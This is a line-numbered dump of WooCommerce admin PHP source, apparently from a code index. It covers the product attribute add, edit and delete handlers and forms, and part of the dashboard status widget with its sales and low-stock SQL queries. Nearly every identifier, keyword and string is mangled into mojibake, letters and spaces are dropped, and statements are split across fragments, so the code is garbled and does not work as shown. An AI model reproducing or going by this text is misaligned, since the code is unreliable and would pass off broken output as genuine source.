113 '©Œibu‹_Üd”by' => 
$©Œibu‹_Üd”by
,

116 
$wpdb
->
	`š£¹
Ğ$wpdb->
´efix
 . 'woocomm”û_©Œibu‹_xÚom›s', 
$©Œibu‹
 );

118 
	`do_aùiÚ
Ğ'woocomm”û_©Œibu‹_added', 
$wpdb
->
š£¹_id
, 
$©Œibu‹
 );

120 
$aùiÚ_com¶‘ed
 = 
Œue
;

124 iàĞ'ed™' ==ğ
$aùiÚ
 ) {

126 
$©Œibu‹
 = 
	`¬¿y
(

127 '©Œibu‹_Ïb–' => 
$©Œibu‹_Ïb–
,

128 '©Œibu‹_Çme' => 
$©Œibu‹_Çme
,

129 '©Œibu‹_ty³' => 
$©Œibu‹_ty³
,

130 '©Œibu‹_Üd”by' => 
$©Œibu‹_Üd”by
,

133 
$wpdb
->
	`upd©e
Ğ$wpdb->
´efix
 . 'woocomm”û_©Œibu‹_xÚom›s', 
$©Œibu‹
, 
	`¬¿y
Ğ'©Œibu‹_id' => 
$©Œibu‹_id
 ) );

135 
	`do_aùiÚ
Ğ'woocomm”û_©Œibu‹_upd©ed', 
$©Œibu‹_id
, 
$©Œibu‹
, 
$Şd_©Œibu‹_Çme
 );

137 iàĞ
$Şd_©Œibu‹_Çme
 !ğ
$©Œibu‹_Çme
 && ! 
	`em±y
( $old_attribute_name ) ) {

139 
$wpdb
->
	`upd©e
(

140 
$wpdb
->
‹rm_xÚomy
,

141 
	`¬¿y
Ğ'xÚomy' => 
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$©Œibu‹_Çme
 ) ),

142 
	`¬¿y
Ğ'xÚomy' => '·_' . 
$Şd_©Œibu‹_Çme
 )

146 
$wpdb
->
	`upd©e
(

147 
$wpdb
->
´efix
 . 'woocommerce_termmeta',

148 
	`¬¿y
Ğ'm‘a_key' => 'Üd”_·_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çme
 ) ),

149 
	`¬¿y
Ğ'm‘a_key' => 'Üd”_·_' . 
	`§n™ize_t™Ë
Ğ
$Şd_©Œibu‹_Çme
 ) )

153 
$Şd_©Œibu‹_Çme_Ëngth
 = 
	`¡¾’
Ğ
$Şd_©Œibu‹_Çme
 ) + 3;

154 
$©Œibu‹_Çme_Ëngth
 = 
	`¡¾’
Ğ
$©Œibu‹_Çme
 ) + 3;

156 
$wpdb
->
	`qu”y
( "

157 
UPDATE
 {
$wpdb
->
po¡m‘a
}

158 
SET
 
m‘a_v®ue
 = 
	`REPLACE
( meta_value, 's:{$old_attribute_name_length}:\"pa_{$old_attribute_name}\"', 's:{$attribute_name_length}:\"pa_{$attribute_name}\"' )

159 
WHERE
 
m‘a_key
 = '_product_attributes'"

163 
$wpdb
->
	`upd©e
(

164 
$wpdb
->
po¡m‘a
,

165 
	`¬¿y
Ğ'm‘a_key' => '©Œibu‹_·_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çme
 ) ),

166 
	`¬¿y
Ğ'm‘a_key' => '©Œibu‹_·_' . 
	`§n™ize_t™Ë
Ğ
$Şd_©Œibu‹_Çme
 ) )

170 
$aùiÚ_com¶‘ed
 = 
Œue
;

173 
	`æush_»wr™e_ruËs
();

178 iàĞ'd–‘e' ==ğ
$aùiÚ
 ) {

180 
$©Œibu‹_id
 = 
	`absšt
Ğ
$_GET
['delete'] );

181 
	`check_admš_»ã»r
Ğ'woocomm”û-d–‘e-©Œibu‹_' . 
$©Œibu‹_id
 );

183 
$©Œibu‹_Çme
 = 
$wpdb
->
	`g‘_v¬
( "SELECT‡ttribute_name FROM {$wpdb->prefix}woocommerce_attribute_taxonomies WHERE‡ttribute_id = $attribute_id" );

185 iàĞ
$©Œibu‹_Çme
 && 
$wpdb
->
	`qu”y
( "DELETE FROM {$wpdb->prefix}woocommerce_attribute_taxonomies WHERE‡ttribute_id = $attribute_id" ) ) {

187 
$xÚomy
 = 
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$©Œibu‹_Çme
 );

189 iàĞ
	`xÚomy_exi¡s
Ğ
$xÚomy
 ) ) {

190 
$‹rms
 = 
	`g‘_‹rms
Ğ
$xÚomy
, 'orderby=name&hide_empty=0' );

191 
	`fÜ—ch
 ( 
$‹rms
 
as
 
$‹rm
 ) {

192 
	`wp_d–‘e_‹rm
Ğ
$‹rm
->
‹rm_id
, 
$xÚomy
 );

196 
	`do_aùiÚ
Ğ'woocomm”û_©Œibu‹_d–‘ed', 
$©Œibu‹_id
, 
$©Œibu‹_Çme
, 
$xÚomy
 );

198 
$aùiÚ_com¶‘ed
 = 
Œue
;

203 iàĞ! 
	`em±y
Ğ
$aùiÚ_com¶‘ed
 ) ) {

204 
	`d–‘e_Œªs›Á
( 'wc_attribute_taxonomies' );

208 iàĞ! 
	`em±y
Ğ
$_GET
['edit'] ) )

209 
$this
->
	`ed™_©Œibu‹
();

211 
$this
->
	`add_©Œibu‹
();

219 
public
 
funùiÚ
 
	$ed™_©Œibu‹
() {

220 
glob®
 
$wpdb
;

222 
$ed™
 = 
	`absšt
Ğ
$_GET
['edit'] );

224 
$©Œibu‹_to_ed™
 = 
$wpdb
->
	`g‘_row
("SELECT * FROM " . $wpdb->
´efix
 . "woocommerce_attribute_taxonomies WHERE‡ttribute_id = '$edit'");

226 
$©t_ty³
 = 
$©Œibu‹_to_ed™
->
©Œibu‹_ty³
;

227 
$©t_Ïb–
 = 
$©Œibu‹_to_ed™
->
©Œibu‹_Ïb–
;

228 
$©t_Çme
 = 
$©Œibu‹_to_ed™
->
©Œibu‹_Çme
;

229 
$©t_Üd”by
 = 
$©Œibu‹_to_ed™
->
©Œibu‹_Üd”by
;

231 <
div
 
şass
="wrap woocommerce">

232 <
div
 
şass
="icÚ32 icÚ32-©Œibu‹s" 
id
="icÚ-woocomm”û"><
br
/></div>

233 <
h2
><?
php
 
	`_e
( 'Edit Attribute', 'woocommerce' ) ?></h2>

234 <
fÜm
 
aùiÚ
="admš.php?·geõroduù_©Œibu‹s&amp;ed™=<?ph°echØabsštĞ$ed™ ); ?>" 
m‘hod
="post">

235 <
bË
 
şass
="form-table">

236 <
tbody
>

237 <
Œ
 
şass
="form-field form-required">

238 <
th
 
scİe
="row" 
v®ign
="top">

239 <
Ïb–
 ="©Œibu‹_Ïb–"><?
php
 
	`_e
( 'Name', 'woocommerce' ); ?></label>

240 </
th
>

241 <
td
>

242 <
šput
 
Çme
="©Œibu‹_Ïb–" 
id
="©Œibu‹_Ïb–" 
ty³
="‹xt" 
v®ue
="<?phpƒchoƒsc_attr( $att_label ); ?>" />

243 <
p
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Name forhe‡ttribute (shown onhe front-end).', 'woocommerce' ); ?></p>

244 </
td
>

245 </
Œ
>

246 <
Œ
 
şass
="form-field form-required">

247 <
th
 
scİe
="row" 
v®ign
="top">

248 <
Ïb–
 ="©Œibu‹_Çme"><?
php
 
	`_e
( 'Slug', 'woocommerce' ); ?></label>

249 </
th
>

250 <
td
>

251 <
šput
 
Çme
="©Œibu‹_Çme" 
id
="©Œibu‹_Çme" 
ty³
="‹xt" 
v®ue
="<?ph°echØesc_©ŒĞ$©t_Çm); ?>" 
maxËngth
="28" />

252 <
p
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Unique slug/reference forhe‡ttribute; must be shorterhan 28 characters.', 'woocommerce' ); ?></p>

253 </
td
>

254 </
Œ
>

255 <
Œ
 
şass
="form-field form-required">

256 <
th
 
scİe
="row" 
v®ign
="top">

257 <
Ïb–
 ="©Œibu‹_ty³"><?
php
 
	`_e
( 'Type', 'woocommerce' ); ?></label>

258 </
th
>

259 <
td
>

260 <
£Ëù
 
Çme
="©Œibu‹_ty³" 
id
="attribute_type">

261 <
İtiÚ
 
v®ue
="£Ëù" <?
php
 
	`£Ëùed
Ğ
$©t_ty³
, '£Ëù' ); ?>><?ph°
	`_e
( 'Select', 'woocommerce' ) ?></option>

262 <
İtiÚ
 
v®ue
="‹xt" <?
php
 
	`£Ëùed
Ğ
$©t_ty³
, '‹xt' ); ?>><?ph°
	`_e
( 'Text', 'woocommerce' ) ?></option>

263 <?
php
 
	`do_aùiÚ
('woocommerce_admin_attribute_types'); ?>

264 </
£Ëù
>

265 <
p
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Determines how you select‡ttributes for…roducts. Under‡dmin…anel ->…roducts ->…roduct data ->‡ttributes -> values, <strong>Text</strong>‡llows manualƒntry whereas <strong>select</strong>‡llows…re-configurederms in‡ drop-down†ist.', 'woocommerce' ); ?></p>

266 </
td
>

267 </
Œ
>

268 <
Œ
 
şass
="form-field form-required">

269 <
th
 
scİe
="row" 
v®ign
="top">

270 <
Ïb–
 ="©Œibu‹_Üd”by"><?
php
 
	`_e
( 'Default sort order', 'woocommerce' ); ?></label>

271 </
th
>

272 <
td
>

273 <
£Ëù
 
Çme
="©Œibu‹_Üd”by" 
id
="attribute_orderby">

274 <
İtiÚ
 
v®ue
="m’u_Üd”" <?
php
 
	`£Ëùed
Ğ
$©t_Üd”by
, 'm’u_Üd”' ); ?>><?ph°
	`_e
( 'Custom ordering', 'woocommerce' ) ?></option>

275 <
İtiÚ
 
v®ue
="Çme" <?
php
 
	`£Ëùed
Ğ
$©t_Üd”by
, 'Çme' ); ?>><?ph°
	`_e
( 'Name', 'woocommerce' ) ?></option>

276 <
İtiÚ
 
v®ue
="id" <?
php
 
	`£Ëùed
Ğ
$©t_Üd”by
, 'id' ); ?>><?ph°
	`_e
( 'Term ID', 'woocommerce' ) ?></option>

277 </
£Ëù
>

278 <
p
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Determineshe sort order ofheerms onhe frontend shop…roduct…ages. If using custom ordering, you can drag‡nd dropheerms inhis‡ttribute.', 'woocommerce' ); ?></p>

279 </
td
>

280 </
Œ
>

281 </
tbody
>

282 </
bË
>

283 <
p
 
şass
="subm™"><
šput
 
ty³
="subm™" 
Çme
="§ve_©Œibu‹" 
id
="subm™" cÏss="bu‰Ú-´im¬y" 
v®ue
="<?php _e( 'Update', 'woocommerce' ); ?>"></p>

284 <?
php
 
	`wp_nÚû_f›ld
Ğ'woocomm”û-§ve-©Œibu‹_' . 
$ed™
 ); ?>

285 </
fÜm
>

286 </
div
>

287 <?
php


288 
	}
}

295 
public
 
funùiÚ
 
	$add_©Œibu‹
() {

297 <
div
 
şass
="wrap woocommerce">

298 <
div
 
şass
="icÚ32 icÚ32-©Œibu‹s" 
id
="icÚ-woocomm”û"><
br
/></div>

299 <
h2
><?
php
 
	`_e
( 'Attributes', 'woocommerce' ) ?></h2>

300 <
br
 
şass
="clear" />

301 <
div
 
id
="col-container">

302 <
div
 
id
="col-right">

303 <
div
 
şass
="col-wrap">

304 <
bË
 
şass
="wideçˆ©Œibu‹s-bË wp-li¡-bË ui-sÜbË" 
¡yË
="width:100%">

305 <
th—d
>

306 <
Œ
>

307 <
th
 
scİe
="cŞ"><?
php
 
	`_e
( 'Name', 'woocommerce' ) ?></th>

308 <
th
 
scİe
="cŞ"><?
php
 
	`_e
( 'Slug', 'woocommerce' ) ?></th>

309 <
th
 
scİe
="cŞ"><?
php
 
	`_e
( 'Type', 'woocommerce' ) ?></th>

310 <
th
 
scİe
="cŞ"><?
php
 
	`_e
( 'Order by', 'woocommerce' ) ?></th>

311 <
th
 
scİe
="cŞ" 
cŞ¥ª
="2"><?
php
 
	`_e
( 'Terms', 'woocommerce' ) ?></th>

312 </
Œ
>

313 </
th—d
>

314 <
tbody
>

315 <?
php


316 
$©Œibu‹_xÚom›s
 = 
	`wc_g‘_©Œibu‹_xÚom›s
();

317 iàĞ
$©Œibu‹_xÚom›s
 ) :

318 
	`fÜ—ch
 (
$©Œibu‹_xÚom›s
 
as
 
$x
) :

319 ?><
Œ
>

321 <
td
><
a
 
h»f
="ed™-gs.php?xÚomy=<?ph°echØesc_html(wc_©Œibu‹_xÚomy_Çme($x->©Œibu‹_Çme)); ?>&amp;po¡_ty³õroduù"><?
php
 
echo
 
	`esc_html
Ğ
$x
->
©Œibu‹_Ïb–
 ); ?></a>

323 <
div
 
şass
="row-aùiÚs"><
¥ª
 cÏss="ed™"><
a
 
h»f
="<?ph°echØesc_u¾Ğadd_qu”y_¬g('ed™', $x->©Œibu‹_id, 'admš.php?·geõroduù_©Œibu‹s'è); ?>"><?
php
 
	`_e
( 'Edit', 'woocommerce' ); ?></a> | </span><span class="delete"><a class="delete" href="<?phpƒchoƒsc_url( wp_nonce_url(‡dd_query_arg('delete', $tax->attribute_id, 'admin.php?page=product_attributes'), 'woocommerce-delete-attribute_' . $tax->attribute_id ) ); ?>"><?php _e( 'Delete', 'woocommerce' ); ?></a></span></div>

324 </
td
>

325 <
td
><?
php
 
echo
 
	`esc_html
Ğ
$x
->
©Œibu‹_Çme
 ); ?></td>

326 <
td
><?
php
 
echo
 
	`esc_html
Ğ
	`ucfœ¡
Ğ
$x
->
©Œibu‹_ty³
 ) ); ?></td>

327 <
td
><?
php


328  
$x
->
©Œibu‹_Üd”by
 ) {

330 
	`_e
( 'Name', 'woocommerce' );

333 
	`_e
( 'Term ID', 'woocommerce' );

336 
	`_e
( 'Custom ordering', 'woocommerce' );

339 ?></
td
>

340 <
td
 
şass
="©Œibu‹-‹rms"><?
php


341 ià(
	`xÚomy_exi¡s
(
	`wc_©Œibu‹_xÚomy_Çme
(
$x
->
©Œibu‹_Çme
))) :

342 
$‹rms_¬¿y
 = 
	`¬¿y
();

343 
$‹rms
 = 
	`g‘_‹rms
Ğ
	`wc_©Œibu‹_xÚomy_Çme
(
$x
->
©Œibu‹_Çme
), 'orderby=name&hide_empty=0' );

344 ià(
$‹rms
) :

345 
	`fÜ—ch
 (
$‹rms
 
as
 
$‹rm
) :

346 
$‹rms_¬¿y
[] = 
$‹rm
->
Çme
;

347 
’dfÜ—ch
;

348 
echo
 
	`im¶ode
(', ', 
$‹rms_¬¿y
);

350 
echo
 '<span class="na">&ndash;</span>';

351 
’dif
;

353 
echo
 '<span class="na">&ndash;</span>';

354 
’dif
;

355 ?></
td
>

356 <
td
 
şass
="©Œibu‹-aùiÚs"><
a
 
h»f
="ed™-gs.php?xÚomy=<?ph°echØesc_html(wc_©Œibu‹_xÚomy_Çme($x->©Œibu‹_Çme)); ?>&amp;po¡_ty³õroduù" cÏss="bu‰Ú‡ligÄighˆt cÚfigu»-‹rms" 
d©a
-
t
="<?ph°_eĞ'CÚfigu»”ms', 'woocomm”û' ); ?>"><?
php
 
	`_e
( 'Configureerms', 'woocommerce' ); ?></a></td>

357 </
Œ
><?
php


358 
’dfÜ—ch
;

360 ?><
Œ
><
td
 
cŞ¥ª
="6"><?
php
 
	`_e
( 'No‡ttributes currentlyƒxist.', 'woocommerce' ) ?></td></tr><?php

361 
’dif
;

363 </
tbody
>

364 </
bË
>

365 </
div
>

366 </
div
>

367 <
div
 
id
="col-left">

368 <
div
 
şass
="col-wrap">

369 <
div
 
şass
="form-wrap">

370 <
h3
><?
php
 
	`_e
( 'Add New Attribute', 'woocommerce' ) ?></h3>

371 <
p
><?
php
 
	`_e
( 'Attributes†et you defineƒxtra…roduct data, such‡s size or colour. You can usehese‡ttributes inhe shop sidebar usinghe "layered‚av" widgets. Please‚ote: you cannot„ename‡n‡ttribute†ater on.', 'woocommerce' ) ?></p>

372 <
fÜm
 
aùiÚ
="admš.php?·geõroduù_©Œibu‹s" 
m‘hod
="post">

373 <
div
 
şass
="form-field">

374 <
Ïb–
 ="©Œibu‹_Ïb–"><?
php
 
	`_e
( 'Name', 'woocommerce' ); ?></label>

375 <
šput
 
Çme
="©Œibu‹_Ïb–" 
id
="©Œibu‹_Ïb–" 
ty³
="‹xt" 
v®ue
="" />

376 <
p
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Name forhe‡ttribute (shown onhe front-end).', 'woocommerce' ); ?></p>

377 </
div
>

379 <
div
 
şass
="form-field">

380 <
Ïb–
 ="©Œibu‹_Çme"><?
php
 
	`_e
( 'Slug', 'woocommerce' ); ?></label>

381 <
šput
 
Çme
="©Œibu‹_Çme" 
id
="©Œibu‹_Çme" 
ty³
="‹xt" 
v®ue
="" 
maxËngth
="28" />

382 <
p
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Unique slug/reference forhe‡ttribute; must be shorterhan 28 characters.', 'woocommerce' ); ?></p>

383 </
div
>

385 <
div
 
şass
="form-field">

386 <
Ïb–
 ="©Œibu‹_ty³"><?
php
 
	`_e
( 'Type', 'woocommerce' ); ?></label>

387 <
£Ëù
 
Çme
="©Œibu‹_ty³" 
id
="attribute_type">

388 <
İtiÚ
 
v®ue
="£Ëù"><?
php
 
	`_e
( 'Select', 'woocommerce' ) ?></option>

389 <
İtiÚ
 
v®ue
="‹xt"><?
php
 
	`_e
( 'Text', 'woocommerce' ) ?></option>

390 <?
php
 
	`do_aùiÚ
('woocommerce_admin_attribute_types'); ?>

391 </
£Ëù
>

392 <
p
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Determines how you select‡ttributes for…roducts. Under‡dmin…anel ->…roducts ->…roduct data ->‡ttributes -> values, <strong>Text</strong>‡llows manualƒntry whereas <strong>select</strong>‡llows…re-configurederms in‡ drop-down†ist.', 'woocommerce' ); ?></p>

393 </
div
>

395 <
div
 
şass
="form-field">

396 <
Ïb–
 ="©Œibu‹_Üd”by"><?
php
 
	`_e
( 'Default sort order', 'woocommerce' ); ?></label>

397 <
£Ëù
 
Çme
="©Œibu‹_Üd”by" 
id
="attribute_orderby">

398 <
İtiÚ
 
v®ue
="m’u_Üd”"><?
php
 
	`_e
( 'Custom ordering', 'woocommerce' ) ?></option>

399 <
İtiÚ
 
v®ue
="Çme"><?
php
 
	`_e
( 'Name', 'woocommerce' ) ?></option>

400 <
İtiÚ
 
v®ue
="id"><?
php
 
	`_e
( 'Term ID', 'woocommerce' ) ?></option>

401 </
£Ëù
>

402 <
p
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Determineshe sort order ofheerms onhe frontend shop…roduct…ages. If using custom ordering, you can drag‡nd dropheerms inhis‡ttribute.', 'woocommerce' ); ?></p>

403 </
div
>

405 <
p
 
şass
="subm™"><
šput
 
ty³
="subm™" 
Çme
="add_Ãw_©Œibu‹" 
id
="subm™" cÏss="bu‰Ú" 
v®ue
="<?php _e( 'Add Attribute', 'woocommerce' ); ?>"></p>

406 <?
php
 
	`wp_nÚû_f›ld
( 'woocommerce-add-new_attribute' ); ?>

407 </
fÜm
>

408 </
div
>

409 </
div
>

410 </
div
>

411 </
div
>

412 <
süt
 
ty³
="text/javascript">

415 
	`jQu”y
('a.d–‘e').
	`şick
(
	`funùiÚ
(){

416 
v¬
 
ªsw”
 = 
	`cÚfœm
 ("<?php _e( 'Are you sure you wanto deletehis‡ttribute?', 'woocommerce' ); ?>");

417 ià(
ªsw”
è 
Œue
;

418  
çl£
;

422 </
süt
>

423 </
div
>

424 <?
php


425 
	}
}

428 
	g’dif
;

430  
Ãw
 
WC_Admš_A‰ribu‹s
();

	@includes/admin/class-wc-admin-dashboard.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Admin_Dashboard' ) ) :

18 şas 
	cWC_Admš_Dashbßrd
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

25 iàĞ
	`cu¼’t_u£r_ÿn
( 'view_woocommerce_reports' ) || current_user_can( 'manage_woocommerce' ) || current_user_can( 'publish_shop_orders' ) ) {

26 
	`add_aùiÚ
Ğ'wp_dashbßrd_£tup', 
	`¬¿y
Ğ
$this
, 'init' ) );

33 
public
 
funùiÚ
 
	$š™
() {

34 iàĞ
	`cu¼’t_u£r_ÿn
( 'publish_shop_orders' ) ) {

35 
	`wp_add_dashbßrd_widg‘
Ğ'woocomm”û_dashbßrd_»ûÁ_»v›ws', 
	`__
Ğ'WooComm”û ReûÁ Rev›ws', 'woocomm”û' ), 
	`¬¿y
Ğ
$this
, 'recent_reviews' ) );

38 
	`wp_add_dashbßrd_widg‘
Ğ'woocomm”û_dashbßrd_¡©us', 
	`__
Ğ'WooComm”û Stus', 'woocomm”û' ), 
	`¬¿y
Ğ
$this
, 'status_widget' ) );

39 
	}
}

44 
public
 
funùiÚ
 
	$¡©us_widg‘
() {

45 
glob®
 
$wpdb
;

47 
	`šşude_Úû
( 'reports/class-wc-admin-report.php' );

49 
$»pÜts
 = 
Ãw
 
	`WC_Admš_R•Üt
();

52 
$§Ës
 = 
$wpdb
->
	`g‘_v¬
( "SELECT SUM(…ostmeta.meta_value ) FROM {$wpdb->posts}‡s…osts

53 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_»ÏtiÚshs
} 
AS
 
»l
 
ON
 
po¡s
.
ID
ô–.
objeù_ID


54 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_xÚomy
} 
AS
 
x
 
	`USING
Ğ
‹rm_xÚomy_id
 )

55 
LEFT
 
JOIN
 {
$wpdb
->
‹rms
} 
AS
 
‹rm
 
	`USING
Ğ
‹rm_id
 )

56 
LEFT
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
…o¡m‘¨
ON
 
po¡s
.
ID
 =…o¡m‘a.
po¡_id


57 
WHERE
 
po¡s
.
po¡_ty³
 = 'shop_order'

58 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

59 
AND
 
x
.
xÚomy
 = 'shop_order_status'

60 
AND
 
‹rm
.
¦ug
 
	`IN
 ( '" . im¶odeĞ"','",‡µly_f‹rsĞ'
woocomm”û_»pÜts_Üd”_¡©u£s
',‡¼ayĞ'
com¶‘ed
', '
´oûssšg
', '
Ú
-
hŞd
' ) ) ) . "' )

61 
AND
 
po¡m‘a
.
m‘a_key
 = '_order_total'

62 
AND
 
po¡s
.
po¡_d©e
 >ğ'" . d©eĞ'
Y
-
m
-01', cu¼’t_timeĞ'
time¡amp
' ) ) . "'

63 
AND
 
po¡s
.
po¡_d©e
 <ğ'" . d©eĞ'
Y
-
m
-
d
 
H
:
i
:
s
', cu¼’t_timeĞ'
time¡amp
' ) ) . "'

67 
$tİ_£Î”
 = 
$wpdb
->
	`g‘_row
( "SELECT SUM( order_item_meta.meta_value )‡s qty, order_item_meta_2.meta_value‡s…roduct_id

68 
FROM
 {
$wpdb
->
po¡s
} 
as
…osts

69 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_»ÏtiÚshs
} 
AS
 
»l
 
ON
 
po¡s
.
ID
ô–.
objeù_ID


70 
LEFT
 
JOIN
 {
$wpdb
->
‹rm_xÚomy
} 
AS
 
x
 
	`USING
Ğ
‹rm_xÚomy_id
 )

71 
LEFT
 
JOIN
 {
$wpdb
->
‹rms
} 
AS
 
‹rm
 
	`USING
Ğ
‹rm_id
 )

72 
LEFT
 
JOIN
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™ems
 
AS
 
Üd”_™ems
 
ON
 
po¡s
.
ID
 = 
Üd”_id


73 
LEFT
 
JOIN
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™emm‘a
 
AS
 
Üd”_™em_m‘a
 
ON
 
Üd”_™ems
.
Üd”_™em_id
 = order_item_meta.order_item_id

74 
LEFT
 
JOIN
 {
$wpdb
->
´efix
}
woocomm”û_Üd”_™emm‘a
 
AS
 
Üd”_™em_m‘a_2
 
ON
 
Üd”_™ems
.
Üd”_™em_id
 = order_item_meta_2.order_item_id

75 
WHERE
 
po¡s
.
po¡_ty³
 = 'shop_order'

76 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

77 
AND
 
x
.
xÚomy
 = 'shop_order_status'

78 
AND
 
‹rm
.
¦ug
 
	`IN
 ( '" . im¶odeĞ"','",‡µly_f‹rsĞ'
woocomm”û_»pÜts_Üd”_¡©u£s
',‡¼ayĞ'
com¶‘ed
', '
´oûssšg
', '
Ú
-
hŞd
' ) ) ) . "' )

79 
AND
 
Üd”_™em_m‘a
.
m‘a_key
 = '_qty'

80 
AND
 
Üd”_™em_m‘a_2
.
m‘a_key
 = '_product_id'

81 
AND
 
po¡s
.
po¡_d©e
 >ğ'" . d©eĞ'
Y
-
m
-01', cu¼’t_timeĞ'
time¡amp
' ) ) . "'

82 
AND
 
po¡s
.
po¡_d©e
 <ğ'" . d©eĞ'
Y
-
m
-
d
 
H
:
i
:
s
', cu¼’t_timeĞ'
time¡amp
' ) ) . "'

83 
GROUP
 
BY
 
´oduù_id


84 
ORDER
 
BY
 
qty
 
DESC


85 
LIMIT
 1

89 
$Ú_hŞd_couÁ
 = 
	`g‘_‹rm_by
Ğ'¦ug', 'Ú-hŞd', 'shİ_Üd”_¡©us' )->
couÁ
;

90 
$´oûssšg_couÁ
 = 
	`g‘_‹rm_by
Ğ'¦ug', '´oûssšg', 'shİ_Üd”_¡©us' )->
couÁ
;

93 
$¡ock
 = 
	`absšt
Ğ
	`max
Ğ
	`g‘_İtiÚ
( 'woocommerce_notify_low_stock_amount' ), 1 ) );

94 
$no¡ock
 = 
	`absšt
Ğ
	`max
Ğ
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ), 0 ) );

96 
$qu”y_äom
 = "FROM {$wpdb->posts}‡s…osts

97 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
…o¡m‘¨
ON
 
po¡s
.
ID
 =…o¡m‘a.
po¡_id


98 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
po¡m‘a2
 
ON
 
po¡s
.
ID
 =…o¡m‘a2.
po¡_id


99 
WHERE
 1=1

100 
AND
 
po¡s
.
po¡_ty³
 
	`IN
 ('product', 'product_variation')

101 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

102 
	`AND
 (

103 
po¡m‘a
.
m‘a_key
 = '_¡ock' 
AND
 
	`CAST
Õo¡m‘a.
m‘a_v®ue
 
AS
 
SIGNED
) <= '{$stock}' AND CAST(postmeta.meta_value AS SIGNED) > '{$nostock}' AND…ostmeta.meta_value != ''

105 
	`AND
 (

106 Ğ
po¡m‘a2
.
m‘a_key
 = '_mªage_¡ock' 
AND
…o¡m‘a2.
m‘a_v®ue
 = 'yes' ) 
	`OR
 ( 
po¡s
.
po¡_ty³
 = 'product_variation' )

110 
$lowš¡ock_couÁ
 = 
	`absšt
Ğ
$wpdb
->
	`g‘_v¬
( "SELECT COUNT( DISTINCT…osts.ID ) {$query_from};" ) );

112 
$qu”y_äom
 = "FROM {$wpdb->posts}‡s…osts

113 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
…o¡m‘¨
ON
 
po¡s
.
ID
 =…o¡m‘a.
po¡_id


114 
INNER
 
JOIN
 {
$wpdb
->
po¡m‘a
} 
AS
 
po¡m‘a2
 
ON
 
po¡s
.
ID
 =…o¡m‘a2.
po¡_id


115 
WHERE
 1=1

116 
AND
 
po¡s
.
po¡_ty³
 
	`IN
 ('product', 'product_variation')

117 
AND
 
po¡s
.
po¡_¡©us
 = 'publish'

118 
	`AND
 (

119 
po¡m‘a
.
m‘a_key
 = '_¡ock' 
AND
 
	`CAST
Õo¡m‘a.
m‘a_v®ue
 
AS
 
SIGNED
) <= '{$nostock}' AND…ostmeta.meta_value != ''

121 
	`AND
 (

122 Ğ
po¡m‘a2
.
m‘a_key
 = '_mªage_¡ock' 
AND
…o¡m‘a2.
m‘a_v®ue
 = 'yes' ) 
	`OR
 ( 
po¡s
.
po¡_ty³
 = 'product_variation' )

126 
$outof¡ock_couÁ
 = 
	`absšt
Ğ
$wpdb
->
	`g‘_v¬
( "SELECT COUNT( DISTINCT…osts.ID ) {$query_from};" ) );

128 <
ul
 
şass
="wc_status_list">

129 <
li
 
şass
="sales-this-month">

130 <
a
 
h»f
="<?phpƒcho‡dmin_url( 'admin.php?page=wc-reports&tab=orders&range=month' ); ?>">

131 <?
php
 
echo
 
$»pÜts
->
	`§Ës_¥¬klše
Ğ'', 
	`max
Ğ7, 
	`d©e
Ğ'd', 
	`cu¼’t_time
( 'timestamp' ) ) ) ); ?>

132 <?
php
 
	`´štf
Ğ
	`__
Ğ"<¡rÚg>%s</¡rÚg> s®e thi mÚth", 'woocomm”û' ), 
	`wc_´iû
Ğ
$§Ës
 ) ); ?>

133 </
a
>

134 </
li
>

135 <?
php
 iàĞ
$tİ_£Î”
 && $tİ_£Î”->
qty
 ) : ?>

136 <
li
 
şass
="best-seller-this-month">

137 <
a
 
h»f
="<?phpƒcho‡dmin_url( 'admin.php?page=wc-reports&tab=orders&report=sales_by_product&range=month&product_ids=' . $top_seller->product_id ); ?>">

138 <?
php
 
echo
 
$»pÜts
->
	`§Ës_¥¬klše
Ğ
$tİ_£Î”
->
´oduù_id
, 
	`max
Ğ7, 
	`d©e
Ğ'd', 
	`cu¼’t_time
( 'timestamp' ) ) ), 'count' ); ?>

139 <?
php
 
	`´štf
Ğ
	`__
Ğ"% tİ s–Ë¸thi mÚth (sŞd %d)", 'woocomm”û' ), "<¡rÚg>" . 
	`g‘_the_t™Ë
Ğ
$tİ_£Î”
->
´oduù_id
 ) . "</¡rÚg>", $tİ_£Î”->
qty
 ); ?>

140 </
a
>

141 </
li
>

142 <?
php
 
’dif
; ?>

143 <
li
 
şass
="processing-orders">

144 <
a
 
h»f
="<?phpƒcho‡dmin_url( 'edit.php?s&post_status=all&post_type=shop_order&shop_order_status=processing' ); ?>">

145 <?
php
 
	`´štf
Ğ
	`_n
Ğ"<¡rÚg>% Üd”</¡rÚg>‡wa™šg…roûssšg", "<¡rÚg>% Üd”s</¡rÚg>‡wa™šg…roûssšg", 
$´oûssšg_couÁ
, 'woocommerce' ), $processing_count ); ?>

146 </
a
>

147 </
li
>

148 <
li
 
şass
="on-hold-orders">

149 <
a
 
h»f
